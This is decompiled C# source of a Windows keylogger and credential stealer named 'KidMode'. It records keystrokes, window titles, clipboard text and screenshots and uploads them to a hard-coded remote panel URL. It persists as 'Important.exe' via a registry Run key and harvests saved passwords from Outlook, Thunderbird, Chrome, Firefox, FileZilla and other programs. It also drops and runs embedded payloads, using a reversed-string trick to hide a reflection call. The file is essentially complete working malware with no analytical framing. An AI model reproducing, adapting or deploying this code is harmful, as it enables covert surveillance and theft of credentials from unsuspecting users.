using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class KidMode
{
	private static Thread T1;

	private static Thread T2;

	private static Thread T3;

	private static Thread T4;

	private static Thread T5;

	private static Thread T6;

	private static Thread T7;

	private static Thread T8;

	private static Thread T9;

	private static Thread T10;

	private static Thread T11;

	private static Thread T12;

	private static Thread T13;

	private static Thread T14;

	private static Random R = new Random();

	private static Mutex M;

	[AccessedThroughProperty("Keylogger")]
	private static KeyHook _Keylogger;

	internal static GetActiveWindow GetWindow = new GetActiveWindow();

	private static RecoverMail RecoverMail = new RecoverMail();

	private static RecoverBrowsers RecoverBrowsers = new RecoverBrowsers();

	private static string KeyStrokeLog = null;

	private static string ClipboardLog = null;

	private static List<string> HotList = new List<string>();

	private static List<string> ScreenshotHotList = new List<string>();

	private static string Restart_Path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Important.exe");

	private static string App_Path = Application.get_ExecutablePath();

	private static string Alt_Location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Important.exe");

	public static string P_Link = "http://jeffme.net/pun/kbpanel/";

	internal static KeyHook Keylogger
	{
		get
		{
			return _Keylogger;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Keylogger != null)
			{
				_Keylogger.Down -= KeyloggerProcess;
			}
			_Keylogger = value;
			if (_Keylogger != null)
			{
				_Keylogger.Down += KeyloggerProcess;
			}
		}
	} = new KeyHook();


	[STAThread]
	public static void Main()
	{
		smethod_0();
		Thread.Sleep(3000);
		T1 = new Thread(ShowMessageBox);
		T1.Start();
		T2 = new Thread(AddToStartup);
		T2.Start();
		T3 = new Thread(WebsiteBlocker);
		T3.Start();
		T4 = new Thread(WebsiteVisitor);
		T4.Start();
		T5 = new Thread(SelfDestruct);
		T5.Start();
		T6 = new Thread(GetCurrentWindow);
		T6.Start();
		T7 = new Thread(RecordKeys);
		T7.Start();
		T8 = new Thread(SendNotification);
		T8.Start();
		T9 = new Thread(AddHotWords);
		T9.Start();
		T10 = new Thread(ClipboardLogging);
		T10.SetApartmentState(ApartmentState.STA);
		T10.Start();
		T11 = new Thread(ScreenLogging);
		T11.Start();
		T12 = new Thread(DownloadAndExecute);
		T12.Start();
		T13 = new Thread(ExecuteBindedFiles);
		T13.Start();
		T14 = new Thread(PasswordRecovery);
		T14.Start();
		Keylogger.CreateHook();
		Application.Run();
	}

	public static void smethod_0()
	{
		object obj = new Mutex(initiallyOwned: false, "70feb62b69f16e0238f741fab228fec2b38e5ff5f816ac6e4169bce9314b2996cfcd208495d565ef66e7dff9f98764da");
		if (Conversions.ToBoolean(Operators.NotObject(NewLateBinding.LateGet(obj, (Type)null, "WaitOne", new object[2] { 0, false }, (string[])null, (Type[])null, (bool[])null))))
		{
			NewLateBinding.LateCall(obj, (Type)null, "Close", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			obj = null;
			ProjectData.EndApp();
		}
	}

	public static void Wait(int i)
	{
		Thread.Sleep(i);
	}

	public static void ShowMessageBox()
	{
	}

	public static void AddToStartup()
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), "Important.exe");
		try
		{
			if (!File.Exists(path))
			{
				File.WriteAllBytes(Alt_Location, File.ReadAllBytes(App_Path));
				AddCurrentKey("71a5c0514ab83382d98154e5a5f9d813", Alt_Location);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void AddCurrentKey(string name, string path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(name, path, RegistryValueKind.String);
	}

	public static void HideFile(string Path)
	{
	}

	public static void WebsiteBlocker()
	{
	}

	public static void WebsiteVisitor()
	{
	}

	public static void SelfDestruct()
	{
	}

	public static void DestructFile(object sender, ElapsedEventArgs e)
	{
	}

	public static void GetCurrentWindow()
	{
		string text = null;
		while (true)
		{
			if (Operators.CompareString(text, GetWindow.GetCaption(), false) != 0 && GetWindow.GetCaption() != null)
			{
				KeyStrokeLog = KeyStrokeLog + Environment.NewLine + "Window title: " + GetWindow.GetCaption() + " End:] " + Environment.NewLine + "Machine Time: " + DateAndTime.get_Now().ToShortTimeString() + " End:] " + Environment.NewLine + "Keystrokes typed: ";
				text = GetWindow.GetCaption();
			}
			Thread.Sleep(10);
		}
	}

	public static void RecordKeys()
	{
		object obj = default(object);
		object obj2 = default(object);
		while (true)
		{
			Thread.Sleep(2700000);
			try
			{
				string keyStrokeLog = KeyStrokeLog;
				int count = Regex.Matches(keyStrokeLog, Regex.Escape("Window title: ")).Count;
				if (ForLoopControl.ForLoopInitObj(obj, (object)0, (object)checked(count - 1), (object)1, ref obj2, ref obj))
				{
					do
					{
						string between = GetBetween(keyStrokeLog, "Window title: ", " End:] ", Conversions.ToInteger(obj));
						string between2 = GetBetween(keyStrokeLog, "Keystrokes typed: ", "Window title: ", Conversions.ToInteger(obj));
						if (Operators.CompareString(between2.Trim(), (string)null, false) != 0)
						{
							Send.SendLog(P_Link, "Keystrokes", between, between2, null, null, null, null, null);
						}
						Wait(100);
					}
					while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			KeyStrokeLog = null;
		}
	}

	private static void KeyloggerProcess(string Key)
	{
		checked
		{
			try
			{
				if (Operators.CompareString(Key, "[Back]", false) != 0)
				{
					KeyStrokeLog += Key;
				}
				else if (KeyStrokeLog.Length != 0 && Operators.CompareString(Conversions.ToString(KeyStrokeLog[KeyStrokeLog.Length - 1]), "]", false) != 0)
				{
					KeyStrokeLog = KeyStrokeLog.Remove(KeyStrokeLog.Length - 1);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void SendNotification()
	{
		if ((object)Application.get_ExecutablePath() != Restart_Path)
		{
			Send.SendLog(P_Link, "Notification", null, null, null, null, null, null, null);
		}
	}

	public static void AddHotWords()
	{
	}

	public static void ClipboardLogging()
	{
		try
		{
			string text = null;
			string text2 = null;
			int num = 0;
			int num2 = 32567;
			num = 1;
			num2 = 32567;
			while (true)
			{
				if ((Operators.CompareString(Clipboard.GetText(), (string)null, false) != 0) & (Operators.CompareString(text2, Clipboard.GetText(), false) != 0))
				{
					text = GetWindow.GetCaption();
					ClipboardLog = text + Environment.NewLine + "Time: " + DateAndTime.get_Now().ToString() + Environment.NewLine + "Text: " + Clipboard.GetText() + Environment.NewLine;
					if (0 - ((num < ClipboardLog.Length) ? 1 : 0) >= num2)
					{
					}
				}
				if (0 - ((num < ClipboardLog.Length) ? 1 : 0) < num2)
				{
					Send.SendLog(P_Link, "Clipboard".Replace("", ""), text, null, null, null, null, null, Send.Clip_Text());
				}
				text2 = Clipboard.GetText();
				Thread.Sleep(100);
				Thread.Sleep(2700000);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void TakeScreenshot(string Extension, string Quality, int Instance)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		ImageFormat val = ImageFormat.get_Png();
		Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
		Bitmap val2 = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
		Graphics val3 = Graphics.FromImage((Image)(object)val2);
		switch (Quality)
		{
		case "SupremeQuality":
			val = ImageFormat.get_Png();
			break;
		case "MediumQuality":
			val = ImageFormat.get_Png();
			break;
		case "LowQuality":
			val = ImageFormat.get_Jpeg();
			break;
		}
		val3.CopyFromScreen(0, 0, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
		string text = Send.Program_data(Send.Get_Comp() + "_" + DateAndTime.get_Now().Month + "_" + DateAndTime.get_Now().Day + "_" + DateAndTime.get_Now().Hour + "_" + DateAndTime.get_Now().Minute + "_" + Conversions.ToString(Instance) + Extension);
		((Image)val2).Save(text, val);
		Thread.Sleep(1000);
		if (File.Exists(text))
		{
			Send.UploadFile(P_Link + "image/upload.php", text);
			File.Delete(text);
		}
	}

	public static void ScreenLogging()
	{
		int instance = 1;
		while (true)
		{
			TakeScreenshot(".jpg", "SupremeQuality", instance);
			Thread.Sleep(3000000);
		}
	}

	public static void DownloadAndExecute()
	{
	}

	public static void DownloadFile(string WebLocation)
	{
	}

	public static void ExecuteBindedFiles()
	{
	}

	public static void ExecuteFile(string ResourceName, bool Executable)
	{
		try
		{
			Assembly assembly = (Assembly)typeof(Assembly).GetMethod(Strings.StrReverse("ylbmessAgnitucexEteG"))!.Invoke(null, null);
			ResourceManager resourceManager = new ResourceManager("Key", assembly);
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), ResourceName);
			byte[] bytes = (byte[])resourceManager.GetObject(ResourceName);
			File.WriteAllBytes(text, bytes);
			Process.Start(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object InvokeDll(ref byte[] _Bytes, ref string _Class, ref string _Sub, ref object _Parameters)
	{
		Assembly assembly = Assembly.Load(_Bytes);
		string text = Strings.Split(assembly.ToString(), ",", -1, (CompareMethod)0)[0] + ".";
		MethodInfo method = assembly.GetType(text + _Class)!.GetMethod(_Sub);
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(assembly.GetType(text + _Class)));
		return method.Invoke(RuntimeHelpers.GetObjectValue(objectValue), (object[])_Parameters);
	}

	public static byte[] GetData(string ResourceName)
	{
		ResourceManager resourceManager = new ResourceManager("Key", Assembly.GetExecutingAssembly());
		return (byte[])resourceManager.GetObject(ResourceName);
	}

	public static void PasswordRecovery()
	{
		while (true)
		{
			try
			{
				RecoverMail.Outlook();
				RecoverMail.NetScape();
				RecoverMail.Thunderbird();
				RecoverMail.Eudora();
				RecoverMail.Incredimail();
				RecoverBrowsers.Firefox();
				RecoverBrowsers.Chrome();
				RecoverBrowsers.InternetExplorer();
				RecoverBrowsers.Opera();
				RecoverBrowsers.Safari();
				Filezilla.Recover();
				IMVU.Recover();
				InternetDownloadManager.Recover();
				JDownloader.Recover();
				Paltalk.Recover();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(3600000);
		}
	}

	public static string GetBetween(string input, string str1, string str2, int ind)
	{
		string input2 = Regex.Split(input, str1)[checked(ind + 1)];
		return Regex.Split(input2, str2)[0];
	}
}
